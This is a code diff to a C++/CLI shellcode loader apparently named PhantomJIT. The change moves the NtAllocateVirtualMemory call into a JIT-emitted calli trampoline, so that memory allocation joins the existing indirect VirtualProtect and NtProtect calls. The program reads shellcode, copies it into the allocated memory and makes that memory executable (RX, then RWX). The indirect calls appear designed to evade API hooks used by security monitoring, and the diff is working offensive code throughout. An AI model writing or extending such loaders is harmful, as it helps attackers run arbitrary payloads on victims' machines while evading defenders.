@@ -24,6 +24,12 @@ typedef NTSTATUS (WINAPI *NtProtectVirtualMemory_t)(
     ULONG NewProtect,
     PULONG OldProtect
 );
+typedef LPVOID (WINAPI *VirtualAlloc_t)(
+    LPVOID lpAddress,
+    SIZE_T dwSize,
+    DWORD flAllocationType,
+    DWORD flProtect
+);
 typedef BOOL (WINAPI *VirtualProtect_t)(
     LPVOID lpAddress,
     SIZE_T dwSize,
@@ -33,13 +39,15 @@ typedef BOOL (WINAPI *VirtualProtect_t)(
 #define PAGE_EXECUTE_READWRITE 0x40
 #define PAGE_READWRITE 0x04
 #define PAGE_EXECUTE_READ 0x20
+public delegate Int32 NtAllocateDelegate(IntPtr process, IntPtr addressPtr, IntPtr zeroBits, IntPtr sizePtr, Int32 allocationType, Int32 protect);
 public delegate Int32 VirtualProtectDelegate(IntPtr address, IntPtr size, Int32 newProtect, IntPtr oldProtectPtr);
 public delegate Int32 NtProtectDelegate(IntPtr process, IntPtr addressPtr, IntPtr sizePtr, Int32 newProtect, IntPtr oldProtectPtr);
 ref class MemoryProtectionJIT
 {
 private:
+    static NtAllocateVirtualMemory_t ntAllocatePtr = nullptr;
     static VirtualProtect_t virtualProtectPtr = nullptr;
-	static NtProtectVirtualMemory_t ntProtectPtr = nullptr;
+    static NtProtectVirtualMemory_t ntProtectPtr = nullptr;
 public:
     static bool Initialize()
     {
@@ -49,15 +57,48 @@ public:
             Console::WriteLine("[JIT] Failed to get module handles");
             return false;
         }
+        ntAllocatePtr = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
         virtualProtectPtr = (VirtualProtect_t)GetProcAddress(hKernel32, "VirtualProtect");
         ntProtectPtr = (NtProtectVirtualMemory_t)GetProcAddress(hNtdll, "NtProtectVirtualMemory");
-        if (!virtualProtectPtr || !ntProtectPtr) {
+        if (!ntAllocatePtr || !virtualProtectPtr || !ntProtectPtr) {
             Console::WriteLine("[JIT] Failed to resolve protection functions");
             return false;
         }
+        Console::WriteLine("[JIT] NtAllocateVirtualMemory at: 0x{0:X}", (UInt64)ntAllocatePtr);
         Console::WriteLine("[JIT] VirtualProtect at: 0x{0:X}", (UInt64)virtualProtectPtr);
         Console::WriteLine("[JIT] NtProtectVirtualMemory at: 0x{0:X}", (UInt64)ntProtectPtr);
         return true;
+    }
+    static NtAllocateDelegate^ CreateNtAllocateDelegate()
+    {
+        if (!ntAllocatePtr) {
+            throw gcnew InvalidOperationException("NtAllocateVirtualMemory not initialized");
+        }
+        Module^ coreMod = Object::typeid->Module;
+        DynamicMethod^ dm = gcnew DynamicMethod(
+            "JIT_NtAllocateVirtualMemory",
+            Int32::typeid,  
+            gcnew array<Type^> { IntPtr::typeid, IntPtr::typeid, IntPtr::typeid, IntPtr::typeid, Int32::typeid, Int32::typeid },
+            coreMod,
+            true
+        );
+        ILGenerator^ il = dm->GetILGenerator();
+        il->Emit(OpCodes::Ldarg_0);  
+        il->Emit(OpCodes::Ldarg_1);  
+        il->Emit(OpCodes::Ldarg_2);  
+        il->Emit(OpCodes::Ldarg_3);  
+        il->Emit(OpCodes::Ldarg, 4); 
+        il->Emit(OpCodes::Ldarg, 5); 
+        il->Emit(OpCodes::Ldc_I8, (Int64)(void*)ntAllocatePtr);
+        il->Emit(OpCodes::Conv_I);
+        il->EmitCalli(
+            OpCodes::Calli,
+            CallingConvention::StdCall,
+            Int32::typeid,
+            gcnew array<Type^> { IntPtr::typeid, IntPtr::typeid, IntPtr::typeid, IntPtr::typeid, Int32::typeid, Int32::typeid }
+        );
+        il->Emit(OpCodes::Ret);
+        return safe_cast<NtAllocateDelegate^>(dm->CreateDelegate(NtAllocateDelegate::typeid));
     }
     static VirtualProtectDelegate^ CreateVirtualProtectDelegate()
     {
@@ -66,7 +107,7 @@ public:
         }
         Module^ coreMod = Object::typeid->Module;
         DynamicMethod^ dm = gcnew DynamicMethod(
-            "JIT_VirtP",
+            "JIT_VirtualProtect",
             Int32::typeid,  
             gcnew array<Type^> { IntPtr::typeid, IntPtr::typeid, Int32::typeid, IntPtr::typeid },
             coreMod,
@@ -81,7 +122,7 @@ public:
         il->Emit(OpCodes::Conv_I);
         il->EmitCalli(
             OpCodes::Calli,
-            CallingConvention::StdCall,  
+            CallingConvention::StdCall,
             Int32::typeid,
             gcnew array<Type^> { IntPtr::typeid, IntPtr::typeid, Int32::typeid, IntPtr::typeid }
         );
@@ -139,42 +180,35 @@ int main(array<String^>^ args)
         Console::WriteLine("[PhantomJIT] Error reading shellcode: {0}", ex->Message);
         return 1;
     }
-    HMODULE hNtdll = GetModuleHandleW(L"ntdll.dll");
-    if (!hNtdll) {
-        Console::WriteLine("[PhantomJIT] Failed to get ntdll handle");
-        return 1;
-    }
-    auto NtAllocateVirtualMemory = (NtAllocateVirtualMemory_t)GetProcAddress(hNtdll, "NtAllocateVirtualMemory");
-    if (!NtAllocateVirtualMemory) {
-        Console::WriteLine("[PhantomJIT] Failed to resolve NtAllocateVirtualMemory");
-        return 1;
-    }
-    PVOID baseAddress = NULL;
-    SIZE_T regionSize = shellcode->Length;
-    NTSTATUS status = NtAllocateVirtualMemory(
-        GetCurrentProcess(),
-        &baseAddress,
-        0,
-        &regionSize,
-        MEM_COMMIT | MEM_RESERVE,
-        PAGE_READWRITE
-    );
-    if (!NT_SUCCESS(status)) {
-        Console::WriteLine("[PhantomJIT] NtAllocateVirtualMemory failed: 0x{0:X}", status);
-        return 1;
-    }
-    Console::WriteLine("[PhantomJIT] Allocated RW memory at 0x{0:X}", (ULONG_PTR)baseAddress);
-    pin_ptr<Byte> pShellcode = &shellcode[0];
-    memcpy(baseAddress, pShellcode, shellcode->Length);
-    Console::WriteLine("[PhantomJIT] Shellcode copied to memory");
     try {
+        Console::WriteLine("[PhantomJIT] Creating JIT allocation delegate...");
+        NtAllocateDelegate^ jitNtAllocate = MemoryProtectionJIT::CreateNtAllocateDelegate();
+        Console::WriteLine("[PhantomJIT] Using JIT NtAllocateVirtualMemory to allocate RW memory...");
+        void* baseAddress = nullptr;
+        SIZE_T regionSize = shellcode->Length;
+        Int32 ntResult = jitNtAllocate(
+            IntPtr(GetCurrentProcess()),
+            IntPtr(&baseAddress),
+            IntPtr::Zero,  
+            IntPtr(&regionSize),
+            (Int32)(MEM_COMMIT | MEM_RESERVE),
+            (Int32)PAGE_READWRITE
+        );
+        if (ntResult < 0) {
+            Console::WriteLine("[PhantomJIT] JIT NtAllocateVirtualMemory failed: 0x{0:X}", ntResult);
+            return 1;
+        }
+        Console::WriteLine("[PhantomJIT] JIT NtAllocateVirtualMemory succeeded at: 0x{0:X}", (UInt64)baseAddress);
+        pin_ptr<Byte> pShellcode = &shellcode[0];
+        memcpy(baseAddress, pShellcode, shellcode->Length);
+        Console::WriteLine("[PhantomJIT] Shellcode copied to memory");
         Console::WriteLine("[PhantomJIT] Creating JIT protection delegates...");
         VirtualProtectDelegate^ jitVirtualProtect = MemoryProtectionJIT::CreateVirtualProtectDelegate();
         Console::WriteLine("[PhantomJIT] Using JIT VirtualProtect to make memory RX...");
         DWORD oldProtect = 0;
         SIZE_T memorySize = shellcode->Length;
         Int32 result = jitVirtualProtect(
-            IntPtr((void*)baseAddress),
+            IntPtr(baseAddress),
             IntPtr((void*)memorySize),
             (Int32)PAGE_EXECUTE_READ,
             IntPtr((void*)&oldProtect)
@@ -186,18 +220,18 @@ int main(array<String^>^ args)
         Console::WriteLine("[PhantomJIT] JIT VirtualProtect succeeded, old protect: 0x{0:X}", oldProtect);
         Console::WriteLine("[PhantomJIT] Using JIT NtProtect to make memory RWX...");
         NtProtectDelegate^ jitNtProtect = MemoryProtectionJIT::CreateNtProtectDelegate();
-        PVOID basePtr = baseAddress;
+        void* basePtrForProtect = baseAddress;
         SIZE_T sizeVar = shellcode->Length;
         DWORD oldProtectNt = 0;
-        Int32 ntResult = jitNtProtect(
+        Int32 ntProtectResult = jitNtProtect(
             IntPtr(GetCurrentProcess()),
-            IntPtr(&basePtr),
+            IntPtr(&basePtrForProtect),
             IntPtr(&sizeVar),
             (Int32)PAGE_EXECUTE_READWRITE,
             IntPtr(&oldProtectNt)
         );
-        if (ntResult < 0) {
-            Console::WriteLine("[PhantomJIT] JIT NtProtect failed: 0x{0:X}", ntResult);
+        if (ntProtectResult < 0) {
+            Console::WriteLine("[PhantomJIT] JIT NtProtect failed: 0x{0:X}", ntProtectResult);
         } else {
             Console::WriteLine("[PhantomJIT] JIT NtProtect succeeded, old protect: 0x{0:X}", oldProtectNt);
         }
